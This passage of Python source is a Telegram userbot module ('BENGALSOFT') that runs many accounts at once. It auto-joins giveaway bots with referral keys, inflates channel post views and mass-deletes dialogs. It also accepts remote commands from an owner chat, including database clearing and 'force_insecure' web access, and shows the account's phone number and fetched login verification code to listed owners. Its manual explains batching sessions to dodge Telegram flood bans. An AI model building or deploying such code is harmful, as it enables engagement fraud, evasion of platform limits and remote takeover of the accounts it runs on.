            return f"<b>üö´ START BESTRANDOMBOT:</b> {e}"

#=======================================================================================

    async def start_bestcontests_bot(self, bot_name, ref_key):
        try:
            await self.client.send_message(
                bot_name,
                "/reset"
            )
            await self.delay_host(2)
            await self.client(StartBotRequest(
                bot=bot_name,
                peer=bot_name,
                start_param=ref_key)
            )
            response = await self.get_bot_response(bot_name)
            if response == "‚ö†Ô∏è –û—à–∏–±–∫–∞, –±–æ—Ç –Ω–µ –æ—Ç–≤–µ—Ç–∏–ª.":
                await self.client(UnblockRequest(bot_name))
                await self.client(StartBotRequest(
                    bot=bot_name,
                    peer=bot_name,
                    start_param=ref_key)
                )
                response = await self.get_bot_response(bot_name)
                if response == "‚ö†Ô∏è –û—à–∏–±–∫–∞, –±–æ—Ç –Ω–µ –æ—Ç–≤–µ—Ç–∏–ª.":
                    return response
            answer = self.strings('unknown_response')
            if response.startswith("‚úÖ –¢–µ–ø–µ—Ä—å —Ç—ã —É—á–∞—Å—Ç–≤—É–µ—à—å"):
                answer = self.strings('success_participate')
            elif response.startswith("üö´ –¢—ã —É–∂–µ —É—á–∞—Å—Ç–≤—É–µ—à—å"):
                answer = self.strings('already_member')
            elif response.startswith("üö´ –ü—Ä–æ–≤–µ—Ä—å –ø–æ–¥–ø–∏—Å–∫–∏"):
                answer = self.strings('no_sponsors')
            elif response.startswith("üö´ –≠—Ç–æ—Ç —Ä–æ–∑—ã–≥—Ä—ã—à —É–∂–µ –∑–∞–≤–µ—Ä—à—ë–Ω!"):
                answer = self.strings('already_finished')
            elif response.startswith("‚úç –í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç –∏–∑ –∫–∞–ø—á–∏."):
                answer = f"<b>üö´ –ú–æ–¥—É–ª—å —Ä–µ–∫–∞–ø—á–∏:</b>  NONE"
            elif response.startswith("‚úåÔ∏è –ü—Ä–∏–≤–µ—Ç"):
                answer = self.strings('none_params')
            else:
                answer += f"{response}"
            return f"<b>‚ôªÔ∏è START: <a href='https://t.me/{bot_name}?start={ref_key}'>BESTCONTESTSBOT.</a></b>\n{answer}"
        except Exception as e:
            return f"<b>üö´ START BESTCONTESTSBOT:</b> {e}"
        
#=======================================================================================

    async def start_tickets_bot(self, bot_name, ref_key):
        try:
            await self.client(StartBotRequest(
                bot=bot_name,
                peer=bot_name,
                start_param=ref_key)
            )
            response = await self.get_bot_response(
                bot_name,
                pos=1
            )
            if response == "‚ö†Ô∏è –û—à–∏–±–∫–∞, –±–æ—Ç –Ω–µ –æ—Ç–≤–µ—Ç–∏–ª.":
                await self.client(UnblockRequest(bot_name))
                await self.client(StartBotRequest(
                    bot=bot_name,
                    peer=bot_name,
                    start_param=ref_key)
                )
                response = await self.get_bot_response(
                    bot_name,
                    pos=1
                )
                if response == "‚ö†Ô∏è –û—à–∏–±–∫–∞, –±–æ—Ç –Ω–µ –æ—Ç–≤–µ—Ç–∏–ª.":
                    return response
            answer = self.strings('unknown_response')
            if response.startswith("‚úÖ –í—ã —É—á–∞—Å—Ç–≤—É–µ—Ç–µ –≤ —Ä–æ–∑—ã–≥—Ä—ã—à–µ!"):
                answer = self.strings('success_participate')
            elif response.startswith("üîÑ –í—ã —É–∂–µ —É—á–∞—Å—Ç–≤—É–µ—Ç–µ!"):
                answer = self.strings('already_member')
            elif response.startswith("‚ÑπÔ∏è –î–ª—è —É—á–∞—Å—Ç–∏—è –≤ —Ä–æ–∑—ã–≥—Ä—ã—à–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–¥–ø–∏—Å–∞—Ç—å—Å—è"):
                answer = self.strings('no_sponsors')
            return f"<b>‚ôªÔ∏è START: <a href='https://t.me/{bot_name}?start={ref_key}'>TICKETSBOT.</a></b>\n{answer}"
        except Exception as e:
            return f"<b>üö´ START:</b> {e}"
        
#=======================================================================================
    
    async def start_thefastes_bot(self, bot_name, ref_key):
        try:
            await self.client(StartBotRequest(
                bot=bot_name,
                peer=bot_name,
                start_param=ref_key)
            )
            response = await self.get_bot_response(bot_name)
            if response == "‚ö†Ô∏è –û—à–∏–±–∫–∞, –±–æ—Ç –Ω–µ –æ—Ç–≤–µ—Ç–∏–ª.":
                await self.client(UnblockRequest(bot_name))
                await self.client(StartBotRequest(
                    bot=bot_name,
                    peer=bot_name,
                    start_param=ref_key)
                )
                response = await self.get_bot_response(bot_name)
                if response == "‚ö†Ô∏è –û—à–∏–±–∫–∞, –±–æ—Ç –Ω–µ –æ—Ç–≤–µ—Ç–∏–ª.":
                    return response
            answer = self.strings('unknown_response')
            if response.startswith("‚úÖ –û—Ç–ª–∏—á–Ω–æ, –≤—ã –ø—Ä–∏–Ω—è–ª–∏ —É—á–∞—Å—Ç–∏–µ"):
                answer = self.strings('success_participate')
            elif response.startswith("‚ùóÔ∏è –í—ã —É–∂–µ –ø—Ä–∏–Ω—è–ª–∏ —É—á–∞—Å—Ç–∏–µ –≤"):
                answer = self.strings('already_member')
            elif response.startswith("‚ùå –†–µ—Ñ–µ—Ä–∞–ª—å–Ω—ã–π –∫–æ–Ω–∫—É—Ä—Å —É–∂–µ –∑–∞–≤–µ—Ä—à—ë–Ω!"):
                answer = self.strings('already_finished')
            elif "–î–ª—è —É—á–∞—Å—Ç–∏—è –Ω—É–∂–Ω–æ –ø–æ–¥–ø–∏—Å–∞—Ç—å—Å—è" in response:
                answer = self.strings('no_sponsors')
            return f"<b>‚ôªÔ∏è START: <a href='https://t.me/{bot_name}?start={ref_key}'>THEFASTES BOT.</a></b>\n{answer}"
        except Exception as e:
            return f"<b>üö´ START:</b> {e}"

#=======================================================================================

    async def start_thefastesrubot(self, bot_name, ref_key):
        try:
            await self.client(StartBotRequest(
                bot=bot_name,
                peer=bot_name,
                start_param=ref_key)
            )
            response = await self.get_bot_response(bot_name)
            if response == "‚ö†Ô∏è –û—à–∏–±–∫–∞, –±–æ—Ç –Ω–µ –æ—Ç–≤–µ—Ç–∏–ª.":
                await self.client(UnblockRequest(bot_name))
                await self.client(StartBotRequest(
                    bot=bot_name,
                    peer=bot_name,
                    start_param=ref_key)
                )
                response = await self.get_bot_response(bot_name)
                if response == "‚ö†Ô∏è –û—à–∏–±–∫–∞, –±–æ—Ç –Ω–µ –æ—Ç–≤–µ—Ç–∏–ª.":
                    return response
            answer = self.strings('unknown_response')
            if response.startswith("‚úÖ –û—Ç–ª–∏—á–Ω–æ, –≤—ã –ø—Ä–∏–Ω—è–ª–∏ —É—á–∞—Å—Ç–∏–µ"):
                answer = self.strings('success_participate')
            elif response.startswith("‚ùóÔ∏è –í—ã —É–∂–µ –ø—Ä–∏–Ω—è–ª–∏ —É—á–∞—Å—Ç–∏–µ –≤"):
                answer = self.strings('already_member')
            elif response.startswith("‚ùå –†–µ—Ñ–µ—Ä–∞–ª—å–Ω—ã–π –∫–æ–Ω–∫—É—Ä—Å —É–∂–µ –∑–∞–≤–µ—Ä—à—ë–Ω!"):
                answer = self.strings('already_finished')
            elif "–î–ª—è —É—á–∞—Å—Ç–∏—è –Ω—É–∂–Ω–æ –ø–æ–¥–ø–∏—Å–∞—Ç—å—Å—è" in response:
                answer = self.strings('no_sponsors')
            return f"<b>‚ôªÔ∏è START: <a href='https://t.me/{bot_name}?start={ref_key}'>THEFASTESRUBOT.</a></b>\n{answer}"
        except Exception as e:
            return f"<b>üö´ START:</b> {e}"
        

#=======================================================================================
#=======================================================================================

    
    async def views_post(self, channel_id=None, post_id=None):
        try:
            if not channel_id and not post_id:
                return "VERR1"
            if post_id:
                await self.client(GetMessagesViewsRequest(
                    peer=channel_id,
                    id=[post_id],
                    increment=True)
                )
                return f"VP"
            elif channel_id:
                messages = await self.client.get_messages(
                    channel_id,
                    limit=5
                )
                message_ids = [msg.id for msg in messages]
                if message_ids:
                    await self.client(GetMessagesViewsRequest(
                        peer=channel_id,
                        id=message_ids,
                        increment=True)
                    )
                    return f"VL{len(message_ids)}"
                else:
                    return "VERR2"
        except Exception as e:
            return f", ERR {e}"

            
#=======================================================================================

    async def views_referal_post(self, bot_name):
        try:
            messages = await self.client.get_messages(bot_name, limit=1)
            if not messages or not messages[0].entities:
                return "Post none"
            message = messages[0]
            if message.entities:
                for entity in message.entities:
                    if isinstance(entity, types.MessageEntityTextUrl):
                        url = entity.url
                        if "t.me/c/" in url:
                            channel_id, post_id = url.split("/")[4:6]
                            channel_id = int(channel_id)
                        elif "t.me/" in url:
                            channel_name, post_id = url.split("/")[3:5]
                            channel_id = (await self.client.get_entity(channel_name)).id
                        await self.client(GetMessagesViewsRequest(
                            peer=channel_id,
                            id=[int(post_id)],
                            increment=True)
                        )
                        return f"<a href='{url}'>VIEW</a>"
            return "Link none"
        except Exception as e:
            return f"VIEW RP: {str(e)}"


#=======================================================================================
#=======================================================================================


    async def handle_user_action(self, message):
        try:
            parts = message.message.split()
            mult, delay_s = None, None
            if len(parts) < 3:
                return
            if message.chat_id != self.owner_chat:
                mult, delay_s = 1, 1
            else:
                mult, delay_s = self.get_delay_host(mult)
            mode, target = parts[1], parts[2]
            mode_actions = {
                "bandel": lambda: self.user_multi_ban_del(target),
                "mute": lambda: self.notificator(target, "0"),
                "unmute": lambda: self.notificator(target, "1"),
            }
            if mode in mode_actions and ("t.me/" in target or target.startswith("@")):
                await self.delay_host(delay_s)
                done_message = await mode_actions[mode]()
            else:
                raise Exception(f"error {mode}:")
        except Exception as e:
            done_message = f"<b>üö´ HANDLE ACTION</b>\n{mode}: {e}"
        finally:
            return await self.send_logger_message(
                done_message,
                delay_info = (mult, delay_s) if None not in (mult, delay_s) else None
            )

#=======================================================================================

    async def notificator(self, bot_name, action):
        try:
            peer = await self.client.get_entity(bot_name)
            if action == "0":
                settings = InputPeerNotifySettings(
                    mute_until=2**31 - 1
                )
                await self.client(functions.account.UpdateNotifySettingsRequest(
                    peer=InputNotifyPeer(peer),
                    settings=settings)
                )
                return "üîá MUTE"
            elif action == "1":
                settings = InputPeerNotifySettings(
                    mute_until=None
                )
                await self.client(functions.account.UpdateNotifySettingsRequest(
                    peer=InputNotifyPeer(peer),
                    settings=settings)
                )
                return "üîä UNMUTE"
            else:
                return None
        except Exception as e:
            return f"<b>üö´ NOTIFICATOR:</b>\n{e}"

#=======================================================================================

    async def user_multi_ban_del(self, target):
        try:
            if target.startswith("@"):
                username = target[1:]
                link = f"https://t.me/{username}"
            elif "t.me" in target:
                try:
                    user = target.split("t.me/")[1].split("/")[0]
                    link = f"https://t.me/{user}"
                except IndexError:
                    return f"<b> BAN-DEL: INVALID LINK.</b>"
                username = user
            else:
                return f"<b> BAN: INVALID LINK.</b>"
            await self.multi_ban_del(username)
            return f"<b>‚ôªÔ∏è BAN-DEL by <a href='{link}'>LINK.</a></b>"
        except ValueError:
            return f"<b> BAN-DEL: INVALID ENTITY.</b>"
        except Exception as e:
            return f"<b> BAN-DEL:</b> {e}"

#=======================================================================================
#=======================================================================================


    async def multi_ban_del(self, bot_name):
        try:
            await self.client(BlockRequest(bot_name))
            await self.client.delete_dialog(bot_name)
            return f"<b>üóë BLOCKED and DELETED.</b>"
        except Exception as e:
            return f"<b>üóë BL-DEL: {e}</b>"
        

#=======================================================================================

        
    async def handle_clean(self, message):
        try:
            parts = message.message.split()
            if not self.get("lic_uns", False):
                return
            self.user = await self.client.get_me()
            recipient = message.chat_id
            targets = parts[1:]
            if not message.is_private:
                if len(parts) < 2 or not any(self.user_validator(target_username) for target_username in targets):
                    return
                if recipient == self.owner_chat:
                    mult = 5 if len(targets) > 5 or "all" in targets else 0
                    _, delay_s = self.get_delay_host(mult)
                    await self.delay_host(delay_s)
            buttons = [
                [
                    {
                        "text": "‚ôªÔ∏è –°—Ç–∞—Ä—Ç",
                        "callback": self.clean_start,
                    },
                    {
                        "text": "üö´ –ó–∞–∫—Ä—ã—Ç—å",
                        "callback": self.clean_cancel
                    }
                ]
            ]
            await self.inline.form(
                message=recipient,
                text="<b>üß® –ó–∞–ø—É—Å–∫–∞–µ–º —à–∞—Ä–º–∞–Ω–∫—É?</b>",
                reply_markup=buttons,
                always_allow=self.owner_list
            )
        except Exception:
            return

#=======================================================================================

    async def clean_start(self, call, counter = 0):
        try:
            self.cleaner = True
            buttons = [
                [
                    {
                        "text": "–ë–õ–Ø–Ø–Ø–Ø –°–¢–û–ü",
                        "callback": self.clean_cancel,
                        "args": (1,)
                    },
                ],
            ]
            await call.edit(
                text=f"<b>‚è≥ –®–∞—Ä–º–∞–Ω–∫–∞ —Ä–∞–±–æ—Ç–∞–µ—Ç...</b>",
                reply_markup=buttons
            )
            whitelist = set(self.owner_list) | {self.owner_chat} | set(self.whitelist_soft) | set(self.whitelist_user)
            async for dialog in self.client.iter_dialogs():
                if not self.cleaner:
                    return await call.edit(f"<b>‚ôªÔ∏è –®–∞—Ä–º–∞–Ω–∫–∞ –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞! –û—á–∏—â–µ–Ω–æ: {counter}.</b>")
                try:
                    if dialog.id in whitelist:
                        continue
                    if dialog.is_group or dialog.is_channel:
                        if dialog.entity and (
                            getattr(dialog.entity, "creator", False) or 
                            (getattr(dialog.entity, "admin_rights", None) and dialog.entity.admin_rights.add_admins)
                        ):
                            continue
                    await self.client.delete_dialog(dialog.id)
                    counter += 1
                    if counter % 50 == 0:
                        await call.edit(
                            text=f"<b>‚è≥ –®–∞—Ä–º–∞–Ω–∫–∞ —Ä–∞–±–æ—Ç–∞–µ—Ç. –û—á–∏—â–µ–Ω–æ: {counter}</b>",
                            reply_markup=buttons
                        )
                    await asyncio.sleep(1)
                except Exception:
                    continue
            return await call.edit(f"<b>‚ôªÔ∏è –®–∞—Ä–º–∞–Ω–∫–∞ –æ—Ç—Ä–∞–±–æ—Ç–∞–ª–∞! –û—á–∏—â–µ–Ω–æ: {counter}.</b>")
        except Exception as e:
            await call.edit(f"<b>üö´ –û—à–∏–±–∫–∞ –∫–ª–∏–Ω–µ—Ä–∞: {e}</b>")
        finally:
            self.cleaner = False

#=======================================================================================

    async def clean_cancel(self, call, mode=None):
        self.cleaner = False
        if mode == 1:
            return
        else:
            return await self.close_form(call)

#=======================================================================================


    async def handle_set_user(self, message):
        try:
            parts, recipient = message.message.split(), message.chat_id
            if message.is_private:
                if len(parts) < 3:
                    return
            else:
                if len(parts) < 4 or not any(self.user_validator(part) for part in parts[3:]):
                    return
                if recipient == self.owner_chat:
                    mult = 3 if len(parts[3:]) > 10 or "all" in parts[3:] else 0
                    await self.delay_host(mult * self.config["group"])
            done_message = await self.update_user_config(
                config_name = parts[1],
                new_value = parts[2]
            )
            return await self.send_custom_message(
                done_message,
                recipient = recipient
            )
        except Exception as e:
            if "list index out of range" in str(e):
                done_message = "NO ARGS"
            else:
                done_message = str(e)
            return await self.send_custom_message(
                f"<b>üö´ HANDLE SET:</b> {done_message}",
                recipient = recipient
            )

#=======================================================================================
    
    async def update_user_config(self, config_name=None, new_value=None):
        try:
            if config_name not in ["logger", "group"]:
                raise Exception(f"{config_name} not found")
            if config_name == "group":
                self.config[config_name] = int(new_value)
                return f"<b>‚ôªÔ∏è CFG: {config_name} set to {new_value}</b>"
            elif config_name == "logger":
                self.config[config_name] = self.bool_validator(new_value)
                return f"<b>‚ôªÔ∏è CFG: {config_name} set to {new_value}</b>"
            else:
                raise Exception(f"{config_name} not found")
        except Exception as e:
            return f"<b>üö´ CFG: {str(e)}</b>"


#=======================================================================================
#=======================================================================================


    async def handle_reconfig(self, message):
        try:
            done_message = await self.reconfig_param()
            if isinstance(message, str):
                text = message
            else:
                text = message.message
            if text == "init":
                group = self.config.get("group", "N/A")
                logger = "ON" if self.config.get("logger", False) else "OFF"
                return f"<b>INIT PACK {group}, LOGGER {logger}</b>"
            elif text == "/reconfig":
                await self.delay_host(self.config["group"]*5)
                return await self.send_custom_message(f"{done_message}")
            else:
                return
        except Exception as e:
            return await self.send_custom_message(f"üö´ HANDLE SETTINGS ERROR:\n{str(e)}")


#=======================================================================================

    async def reconfig_param(self):
        try:
            if not isinstance(self.settings_list, list):
                return "üö´ –ù–µ—Ç —Å–ø–∏—Å–∫–∞ —Å—Å—ã–ª–æ–∫"

            if not self.user:
                self.user = await self.client.get_me()
            me = self.user
            my_username = f"@{me.username}" if me.username else None
            if not my_username:
                return "üö´ –ù–µ—Ç user, –Ω–µ–ª—å–∑—è –Ω–∞—Å—Ç—Ä–æ–∏—Ç—å."

            for n, link in enumerate(self.settings_list, 1):
                channel, post_id = link.split("/")[-2:]
                message = await self.client.get_messages(
                    int(channel),
                    ids=int(post_id)
                )

                if not message or not message.message:
                    continue

                lines = message.message.split('\n')
                if not lines or f"SETTINGS {self.softname} {n}" not in lines[0]:
                    continue

                current_group, result = None, ""
                for line in lines[1:]:
                    line = line.strip()
                    if not line:
                        continue
                    if line.startswith("group"):
                        try:
                            current_group = int(line.split()[1])
                        except:
                            continue
                    elif line.startswith("@") and current_group:
                        username = line.split()[0]
                        if self.user_validator(username):
                            group = await self.update_user_config("group", current_group)
                            result += f"{group}\n"
                            if "logger" in line:
                                logger = await self.update_user_config("logger", True)
                                result += f"{logger}\n"
                            else:
                                logger = await self.update_user_config("logger", False)
                                result += f"{logger}\n"
                            return f"{result}"
            return "üö´ –ó–∞–ø–∏—Å–∏ –ø—Ä–æ –∞–∫–∫ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã."
        except Exception as e:
            return f"üö´ RECONFIG: {str(e)}"
        
#=======================================================================================
#=======================================================================================


    async def handle_get_user(self, message):
        try:
            if not self.get("license", False):
                return
            self.user = await self.client.get_me()    
            parts = message.message.split()
            recipient = message.chat_id
            if not message.is_private:
                if len(parts) < 2:
                    return
                param, values = parts[1], parts[2:]
                if param == "group":
                    if str(self.config["group"]) not in values:
                        return
                elif param == "logger":
                    if not values:
                        return
                    value = self.bool_validator(" ".join(values))
                    if self.config["logger"] != value:
                        return
                else:
                    if not any(self.user_validator(part) for part in parts[1:]):
                        return
                if recipient == self.owner_chat:
                    mult = 2 if len(parts[1:]) > 3 or "all" in parts[1:] else 0
                    delay_s = mult * self.config["group"]
                    await self.delay_host(delay_s)
            buttons = [
                [
                    {
                        "text": "‚ôªÔ∏è –û—Ç–∫—Ä—ã—Ç—å",
                        "callback": self.get_user_main,
                    },
                    {
                        "text": "üö´ –ó–∞–∫—Ä—ã—Ç—å",
                        "callback": self.close_form,
                    },
                ]
            ]
            return await self.inline.form(
                message=recipient,
                text="<b>‚öôÔ∏è –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± –∞–∫–∫–∞—É–Ω—Ç–µ</b>",
                reply_markup=buttons,
                always_allow=self.owner_list,
            )
        except Exception:
            pass

#=======================================================================================

    async def get_user_main(self, call):
        try:
            text = "<b>‚öôÔ∏è –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± –∞–∫–∫–∞—É–Ω—Ç–µ</b>"
            buttons = [
                [
                    {
                        "text": "–ö–æ–Ω—Å—Ç–∞–Ω—Ç—ã",
                        "callback": self.get_user_constants,
                    },
                    {
                        "text": "–ù–∞—Å—Ç—Ä–æ–π–∫–∏",
                        "callback": self.get_user_settings,
                    },
                ],
                [
                    {
                        "text": "–ê–∫–∫–∞—É–Ω—Ç",
                        "callback": self.get_user_account,
                    },
                    {
                        "text": "–°–µ—Ä–≤–µ—Ä",
                        "callback": self.get_user_server
                    },
                ],
                [
                    {
                        "text": "üö´ –ó–∞–∫—Ä—ã—Ç—å",
                        "callback": self.close_form,
                    },
                ]
            ]
            await call.edit(
                text=text,
                reply_markup=buttons
            )
        except Exception as e:
            return f"<b>‚ùå INFO: {e}</b>"

#=======================================================================================

    async def get_user_constants(self, call):
        buttons = [
            [
                {
                    "text": "¬´ –ù–∞–∑–∞–¥",
                    "callback": self.get_user_main
                },
                {
                    "text": "üö´ –ó–∞–∫—Ä—ã—Ç—å",
                    "callback": self.close_form,
                },
            ]
        ]
        await call.edit(
            text=self.strings("waiting"),
            reply_markup=buttons
        )
        owner_list = ", ".join([f"{owner}" for owner in self.owner_list])
        text = (
            "<b>‚ôªÔ∏è –°–∏—Å—Ç–µ–º–Ω—ã–µ –∫–æ–Ω—Å—Ç–∞–Ω—Ç—ã</b>\n\n"
            f"<b>SOFT NAME: {self.softname}</b>\n"
            f"<b>SOFT VERSION: {self.softversion}</b>\n\n"
            f"<b>OWNER USER: {self.owner_user}\n</b>{owner_list}\n\n"
            f"<b>OWNER <a href='{self.owner_link}'>CHAT</a>: {self.owner_chat}</b>\n\n"
        )
        await call.edit(
            text=text,
            reply_markup=buttons
        )

#=======================================================================================

    async def get_user_settings(self, call):
        buttons = [
            [
                {
                    "text": "¬´ –ù–∞–∑–∞–¥", 
                    "callback": self.get_user_main
                },
                {
                    "text": "üö´ –ó–∞–∫—Ä—ã—Ç—å",
                    "callback": self.close_form,
                },
            ]
        ]
        await call.edit(
            text=self.strings("waiting"),
            reply_markup=buttons
        )
        text = (
            "<b>‚ôªÔ∏è –¢–µ–∫—É—â–∏–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã</b>\n\n"
            f"<b>logger:</b> {self.config['logger']}\n"
            f"<b>group:</b> {self.config['group']}\n"
            f"<b>selector:</b> {self.selector}"
        )
        await call.edit(
            text=text, 
            reply_markup=buttons
        )

#=======================================================================================

    async def get_user_account(self, call):
        buttons = [
            [
                {
                    "text": "üîé –ù–∞–π—Ç–∏ –∫–æ–¥", 
                    "callback": self.get_user_verification
                },
            ],
            [
                {
                    "text": "¬´ –ù–∞–∑–∞–¥",
                    "callback": self.get_user_main
                },
                {
                    "text": "üö´ –ó–∞–∫—Ä—ã—Ç—å",
                    "callback": self.close_form,
                },
            ]
        ]
        await call.edit(
            text=self.strings("waiting"),
            reply_markup=buttons
        )
        text = (
            "<b>‚ôªÔ∏è –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± –∞–∫–∫–∞—É–Ω—Ç–µ</b>\n\n"
            f"{(self.user.first_name or '') + ' ' + (self.user.last_name or '').strip()}\n"
            f"<b>TAG:</b> {'@' + self.user.username if self.user.username else 'NOTSET'}\n"
            f"<b>NUM:</b> {'+' + self.user.phone if self.user.phone else 'NOTSET'}\n"
            f"<b>UID:</b> <code>{self.user.id}</code>"
        )
        await call.edit(
            text=text, 
            reply_markup=buttons
        )

#=======================================================================================

    async def get_user_server(self, call):
        buttons = [
            [
                {
                    "text": "–û–±–Ω–æ–≤–∏—Ç—å",
                    "callback": self.get_user_server
                }
            ],
            [
                {
                    "text": "¬´ –ù–∞–∑–∞–¥",
                    "callback": self.get_user_main
                },
                {
                    "text": "üö´ –ó–∞–∫—Ä—ã—Ç—å",
                    "callback": self.close_form,
                }
            ]
        ]
        await call.edit(
            text=self.strings("waiting"),
            reply_markup=buttons
        )
        text = await self.get_server_info()
        await call.edit(
            text=text,
            reply_markup=buttons
        )

#=======================================================================================

    async def get_user_verification(self, call):
        buttons = [
            [
                {
                    "text": "üîÑ –û–±–Ω–æ–≤–∏—Ç—å",
                    "callback": self.get_user_verification
                }
            ],
            [
                {
                    "text": "¬´ –ù–∞–∑–∞–¥",
                    "callback": self.get_user_main,
                },
                {
                    "text": "üö´ –ó–∞–∫—Ä—ã—Ç—å",
                    "callback": self.close_form,
                }
            ]
        ]
        await call.edit(
            text=self.strings("waiting"),
            reply_markup=buttons
        )
        text = await self.get_verif_code()
        await call.edit(
            text=text, 
            reply_markup=buttons
        )

#=======================================================================================
#=======================================================================================


    async def handle_user_system(self, message):
        try:
            if isinstance(message, str):
                text, recipient = message, self.owner_chat
                parts = text.split()
                if len(parts) < 2:
                    return
            else:
                text, recipient = message.message, message.chat_id
                parts = text.split()
                targets = parts[2:]
                if not message.is_private:
                    if len(parts) < 3 or not any(self.user_validator(target_username) for target_username in targets):
                        return
                    if recipient == self.owner_chat:
                        mult = 5 if len(targets) > 7 or "all" in targets else 0
                        _, delay_s = self.get_delay_host(mult)
                        await self.delay_host(delay_s)
            command_handlers = {
                "ping": lambda: self.invoke(
                    "ping", None, recipient
                ),
                "unloadmod": lambda: self.invoke(
                    "unloadmod", "BENGALSOFT", "me"
                ),
                "cleardb": lambda: self.invoke(
                    "cleardb", "force_insecure", recipient
                ),
                "clearlogs": lambda: self.invoke(
                    "clearlogs", None, recipient
                ),
                "weburl": lambda: self.invoke(
                    "weburl", "force_insecure", recipient
                ),
                "config": lambda: self.invoke(
                    "config", "BENGALSOFT", recipient
                ),
            }
            action_type = parts[1].strip().lower()
            if action_type in command_handlers:
                await command_handlers[action_type]()
            else:
                existing_commands = ", ".join(command_handlers.keys())
                await self.send_custom_message(f"<b>üö´ HANDLE SYSTEM.</b> –î–æ—Å—Ç—É–ø–Ω—ã–µ: {existing_commands}.")
            return
        except Exception as e:
            await self.send_logger_message(f"<b>üö´ HANDLE SYSTEM:</b> {e}")


#=======================================================================================
#=======================================================================================


    async def handle_contacter(self, message):
        try:
            if isinstance(message, str):
                text = message
            else:
                text = message.message
            parts = text.split()
            if len(parts) < 4:
                return
            mode, target, note = parts[1], parts[2], parts[3]
            if target.isdigit():
                target = int(target)
            try:
                user = await self.client.get_entity(target)
            except Exception as e:
                if "Could not find the input entity for PeerUser" in str(e):
                    return False
                else:
                    raise Exception(f"GET ENTITY - {str(e)}")
            if mode == "add":
                await self.client(DeleteContactsRequest(id=[user.id]))
                await self.delay_host(1)
                await self.client(AddContactRequest(
                    id=user.id,
                    first_name=user.first_name,
                    last_name=f" ‚Ä¢ {note}".strip(),
                    phone="phone",
                    add_phone_privacy_exception=False,
                ))
                done_message = f"‚ôªÔ∏è –ö–æ–Ω—Ç–∞–∫—Ç {target} –¥–æ–±–∞–≤–ª–µ–Ω."
            elif mode == "del":
                await self.client(DeleteContactsRequest(id=[user.id]))
                done_message = f"‚ôªÔ∏è –ö–æ–Ω—Ç–∞–∫—Ç {target} —É–¥–∞–ª–µ–Ω."
            else:
                return
            if text.startswith("init"):
                return True
            else:
                return await self.send_custom_message(done_message)
        except Exception as e:
            await self.send_custom_message(f"üö´ CONTACTER: {str(e)}")
            return False


#=======================================================================================
#=======================================================================================


    async def handle_manual(self, message):
        try:
            parts = message.message.split()
            self.user = await self.client.get_me()
            await self.handle_license()
            if not self.get("license", False):
                return
            if not message.is_private:
                if len(parts) != 2 or not self.user_validator(parts[1]):
                    return
            caption = (
                f"<b>LICENSE <a href='https://t.me/BENGALSOFT'>BENGALSOFT</a></b>\n"
                f"<b>OWNER: {self.softname}</b>\n"
                f"<b>MODULE VERSION: {self.softversion}</b>"
            )
            buttons = [
                [
                    {
                        "text": "‚ôªÔ∏è –û—Ç–∫—Ä—ã—Ç—å",
                        "callback": self.manual_main,
                    },
                    {
                        "text": "üö´ –ó–∞–∫—Ä—ã—Ç—å",
                        "callback": self.close_form,
                    },
                ]
            ]
            return await self.inline.form(
                message=message.chat_id,
                text=caption,
                reply_markup=buttons,
                always_allow=self.owner_list,
            )
        except Exception as e:
            await self.send_custom_message(f"üö´ HANDLE MANUAL: {str(e)}")

#=======================================================================================

    async def manual_main(self, call):
        text = f"<b>{self.owner_user}, –≤—ã–±–µ—Ä–∏ —Ä–∞–∑–¥–µ–ª:</b>"
        buttons = [
            [
                {
                    "text": "–ë–∞–∑–∏—Å",
                    "callback": self.manual_basic
                },
                {
                    "text": "–ö–æ–º–∞–Ω–¥—ã",
                    "callback": self.manual_commands
                },
                {
                    "text": "–û–±—â–µ–µ",
                    "callback": self.manual_general
                },
            ],
            [
                {
                    "text": "üö´ –ó–∞–∫—Ä—ã—Ç—å",
                    "callback": self.close_form,
                },
            ]
        ]
        await call.edit(
            text=text,
            reply_markup=buttons,
            photo="https://i.ibb.co/TT3TP4n/BENGAL.jpg"
        )

#=======================================================================================

    async def manual_basic(self, call):
        text = (
            "<b>‚öôÔ∏è –ë–∞–∑–æ–≤–∞—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∞ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è —Å –ø–æ–º–æ—â—å—é –∫–æ–º–∞–Ω–¥ /set –∏ /reconfig\n\n"

            "–°–Ω–∞—á–∞–ª–∞ —Ä–∞–∑–¥–µ–ª–∏ –∏ –ø—Ä–æ–Ω—É–º–µ—Ä—É–π –≤—Å–µ —Å–≤–æ–∏ –∞–∫–∫–∞—É–Ω—Ç—ã. "
            "–ù–∞–ø—Ä–∏–º–µ—Ä, –µ—Å–ª–∏ —Å–µ—Ä–≤–µ—Ä —Å 20 —Å–µ—Å—Å–∏—è–º–∏ ‚Äî —Å—Ç–∞–≤–∏–º 4 –ø–∞—á–∫–∏ –ø–æ 5 —à—Ç—É–∫. –ù—É –∏–ª–∏ 2 –ø–æ 10.\n\n"

            "–ò–∑–Ω–∞—á–∞–ª—å–Ω–æ –≤–µ–∑–¥–µ —Å—Ç–æ–∏—Ç –Ω–æ–º–µ—Ä 1. –ü–∞—á–∫–∞ (group) ‚Äî —ç—Ç–æ –º–Ω–æ–∂–∏—Ç–µ–ª—å, –∫–æ—Ç–æ—Ä—ã–π –æ—Ç–≤–µ—á–∞–µ—Ç –∑–∞ –ö–î. "
            "KD –Ω—É–∂–Ω–æ —á—Ç–æ–±—ã –∑–∞–¥–∞–Ω–Ω—ã–µ –¥–µ–π—Å—Ç–≤–∏—è –Ω–µ –≤—ã–ø–æ–ª–Ω—è–ª–∏—Å—å –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ –∏ —Ç–≥ –Ω–µ –¥–∞–ª–∞ —Ñ–ª—É–¥–±–∞–Ω.\n\n"

